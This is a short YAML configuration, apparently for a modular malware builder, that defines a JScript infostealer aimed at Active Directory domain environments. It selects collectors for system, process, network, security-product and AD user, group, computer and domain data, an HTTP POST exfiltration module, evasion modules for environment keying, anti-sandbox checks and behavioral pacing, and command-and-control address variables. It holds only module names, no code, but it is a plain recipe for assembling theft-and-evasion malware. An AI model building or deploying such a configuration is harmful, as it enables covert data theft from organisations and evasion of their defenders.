name: js_infostealer_ad
description: JScript infostealer focused on AD enumeration for domain environments
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/security_products
  - ad_collectors/ad_users
  - ad_collectors/ad_groups
  - ad_collectors/ad_computers
  - ad_collectors/ad_domains

exfil: exfil/http_post
arch: arch/sequential

evasion:
  - evasion/env_keying
  - evasion/anti_sandbox
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
